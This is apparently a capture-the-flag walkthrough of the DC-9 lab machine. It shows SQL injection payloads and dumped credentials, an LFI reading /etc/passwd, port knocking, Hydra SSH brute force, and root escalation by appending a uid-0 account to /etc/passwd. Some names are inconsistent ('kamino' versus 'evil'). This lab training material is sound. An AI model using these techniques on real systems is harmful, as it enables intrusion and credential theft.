---
layout: default
title: DC-9
parent: Proving Grounds Play
nav_order: 16
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.209
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:21 EST
Nmap scan report for 192.168.160.209
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset), 1 filtered tcp port (port-unreach)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds

```

# Enumeration

---

## 80 | HTTP

Simple web site called Example.com - Staff Details.

Poking around the web site does not yield much.

There is a _Search_ page we can try SQL injection with _sqlmap_.

![search](../../../assets/images/ctfs/proving_grounds/dc-9/search.png)

Intercept in Burp and copy the entire GET Request and replace the _search_ payload with _FUZZME_.

![burp](../../../assets/images/ctfs/proving_grounds/dc-9/burp.png)

Paste into a file named _req_

![req](../../../assets/images/ctfs/proving_grounds/dc-9/req.png)

Run the _req_ file in _sqlmap_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ sqlmap -r req --dump --batch --dbms=mysql --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:21:42 /2023-11-09/
[19:22:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[19:22:09] [INFO] starting 3 processes
[19:22:19] [WARNING] no clear password(s) found
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

[19:22:19] [INFO] table 'Staff.Users' dumped to CSV file '/home/vagrant/.local/share/sqlmap/output/192.1
68.160.209/dump/Staff/Users.csv'
[19:22:19] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
[19:22:19] [INFO] fetching entries for table 'StaffDetails' in database 'Staff'
Database: Staff
Table: StaffDetails
[17 entries]
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position
                     |
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO
                     |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Res
ources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems A
dministrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk
                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver
                     |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores
                     |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts
                     |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Ac
counts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President
 - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor
                     |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal
Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructo
r                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing
                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant
 Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident
Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replaceme
nt Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant
 Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+----------
---------------------+
```

The above was the exfiltration from the _staff_ database.

Now we exfiltrate from the _users_ database by adding the _-D_ flag with the _users_ parameter.

```bash
──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ sqlmap -r req --dump --batch --dbms=mysql --dbs -D users
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It
is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume
 no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:32:52 /2023-11-09/

[19:32:52] [INFO] parsing HTTP request from 'req'
[19:32:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=FUZZME' AND (SELECT 7756 FROM (SELECT(SLEEP(5)))jGTb) AND 'NRma'='NRma

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=FUZZME' UNION ALL SELECT NULL,CONCAT(0x7171717171,0x4559644b454269584875796c53566c54
75426652586873526a57625242514e4c544d54624a754273,0x716b7a7171),NULL,NULL,NULL,NULL-- -
---
[19:32:52] [INFO] testing MySQL
[19:32:52] [INFO] confirming MySQL
[19:32:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)                                                   web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)                                                            [19:32:53] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users

[19:32:53] [INFO] fetching tables for database: 'users'
[19:32:53] [INFO] fetching columns for table 'UserDetails' in database 'users'
[19:32:53] [INFO] fetching entries for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[19:32:54] [INFO] table 'users.UserDetails' dumped to CSV file '/home/vagrant/.local/share/sqlmap/output/192.168.160.209/dump/users/UserDetails.csv'
[19:32:54] [INFO] fetched data logged to text files under '/home/vagrant/.local/share/sqlmap/output/192.168.160.209'
[19:32:54] [WARNING] your sqlmap version is outdated

[*] ending @ 19:32:54 /2023-11-09/
```

Add the _users_ table output to a _creds_ file and cut the usernames and save to a _users_ file.

```bash

# Cut the username column from the creds table
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ cat creds | cut -d "|" -f6

```

Now cut the passwords from _creds_ and save to a _pass_ file.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ cat creds | cut -d "|" -f4

```

Crack the admin hash that was provided in the initial _sqlmap_ output and add the the top of the _pass_ file.

![crackstation](../../../assets/images/ctfs/proving_grounds/dc-9/crackstation.png)

Now we can logon to the site as _admin_.

We land on _welecom.php_ and there is a message at the bottom of the screen "File does not exist".

### Parameter Discovery with WFUZZ

We will do some fuzzing against the site.

First we need to get the session ID from Burp.

![burp2](../../../assets/images/ctfs/proving_grounds/dc-9/burp2.png)

Now we can run WFUZZ against the _/welcome.php_ page with the _PHPSESSID_ parameter and using \*--hh 963" to ignore output that is 963 bytes.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 --hh 963 -b "PHPSESSID=3f7m38o92mpldiuu4mug1f18t0" "http://192.168.160.209/welcome.php?FUZZ=../../../../../../../etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.160.209/welcome.php?FUZZ=../../../../../../../etc/passwd
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002206:   200        85 L     150 W      3316 Ch     "file"

Total time: 0
Processed Requests: 3452
Filtered Requests: 3451
Requests/sec.: 0

```

We have the parameter "file" to use to display _/etc/passwd_

![lfi](../../../assets/images/ctfs/proving_grounds/dc-9/lfi.png)

# Exploitation

---

## Determine if this is LFI vs. Directory Traversal

We can attempt to access files in the _/var/www/html_ directory like _welcome.php_ and _index.php_

```bash
URL: http://192.168.160.209/welcome.php?file=../../../../../../var/www/html/welcome.php

URL: http://192.168.160.209/welcome.php?file=../../../../../../var/www/html/index.php
```

These do not load, so this confirms it is _LFI_

## Test Port Knocking via LFI

Attempt to access the Knock Daemon at _/etc/knockd.conf_ to get the sequence to open a port.

![knockd](../../../assets/images/ctfs/proving_grounds/dc-9/knockd.png)

This gives us the sequence required to unlock the SSH service on the target.

Use the following script to unlock the port via port knocking:

```bash
# Create knock.sh
vim knock.sh

# Add the following bash scripting for loop
for x in 7469 8475 9842; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.160.209;
done


# Run the knock script
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ ./knock.sh
3Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 22:57 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.160.209
Host is up (0.055s latency).

PORT     STATE  SERVICE
7469/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 22:57 EST
Nmap scan report for 192.168.160.209
Host is up (0.054s latency).

PORT     STATE  SERVICE
8475/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 22:57 EST
Nmap scan report for 192.168.160.209
Host is up (0.054s latency).

PORT     STATE  SERVICE
9842/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds


```

Then we rescan the target and now see that port 22 is open.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ nmap -p22 192.168.160.209
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 22:57 EST
Nmap scan report for 192.168.160.209
Host is up (0.055s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```

Now we can run Hydra against the target on SSH/22 with the _user_ and _pass_ files we created earlier with _SQLMap_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ hydra -L users -P pass ssh://192.168.160.209
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-09 23:00:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 324 login tries (l:18/p:18), ~21 tries per task
[DATA] attacking ssh://192.168.160.209:22/
[22][ssh] host: 192.168.160.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.160.209   login: joeyt   password: Passw0rd
[STATUS] 272.00 tries/min, 272 tries in 00:01h, 54 to do in 00:01h, 14 active
[22][ssh] host: 192.168.160.209   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-09 23:01:26

```

# Post-Exploitation

---

SSH in as _janitor_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ ssh janitor@192.168.160.209
The authenticity of host '192.168.160.209 (192.168.160.209)' can't be established.
ED25519 key fingerprint is SHA256:QqKiAU3zrowiN9K1SVvmSWvLBZAqdSpT0aMLTwGlyvo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.160.209' (ED25519) to the list of known hosts.
janitor@192.168.160.209's password:
Permission denied, please try again.
janitor@192.168.160.209's password:
Permission denied, please try again.
janitor@192.168.160.209's password:
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
janitor@dc-9:~$ id
uid=1016(janitor) gid=1016(janitor) groups=1016(janitor)

```

Exfiltrate additional passwords in _/home/janitor/.secrets-for-putin_

```bash
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts

```

We add these additional passwords to our _pass_ file and rerun Hydra against the SSH service

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ hydra -L users -P pass ssh://192.168.160.209
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-09 23:07:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 432 login tries (l:18/p:24), ~27 tries per task
[DATA] attacking ssh://192.168.160.209:22/
[22][ssh] host: 192.168.160.209   login: fredf   password: B4-Tru3-001

```

## Pivot to fredf Account

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-9]
└─$ ssh fredf@192.168.160.209
fredf@192.168.160.209's password:
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
fredf@dc-9:~$ which python

```

## Sudo -l

```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

```

We can run /opt/devstuff/dist/test/test with sudo privileges.

If we try to execute /opt/devstuff/dist/test/test it shows the usage.

```bash
fredf@dc-9:/opt/devstuff/dist/test$ ./test
Usage: python test.py read append

```

We can find the _test.py_ file in _/opt/devstuff/_

```bash
fredf@dc-9:/opt/devstuff/dist/test$ find / -name test.py 2>/dev/null
/opt/devstuff/test.py

```

Reviewing _test.py_ it shows that it reads a file and appends to that file.

```bash
fredf@dc-9:/opt/devstuff$ cat test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()

```

We will exploit this by appending a new user to _/etc/passwd_

First we create the file that will be read in by _test.py_ in /var/tmp

The following will add a root user with the password _i<3hacking_

```bash
fredf@dc-9:/var/tmp$ echo 'evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash' > /var/tmp/evil


fredf@dc-9:/var/tmp$ cat evil
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

Now we can execute the _/opt/devstuff/dist/test/test_ and read in the _/var/tmp/kamino_ and append to the file _/etc/passwd_

```bash
redf@dc-9:/var/tmp$ sudo /opt/devstuff/dist/test/test /var/tmp/evil /etc/passwd

redf@dc-9:/var/tmp$ cat /etc/passwd

# we see our newly created root user "evil" at the bottom of /etc/passwd
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

Our exploit was successful and now we can switch to the _kamino_ user and have root privileges.

```bash
fredf@dc-9:/var/tmp$ su evil
Password:
root@dc-9:/var/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```
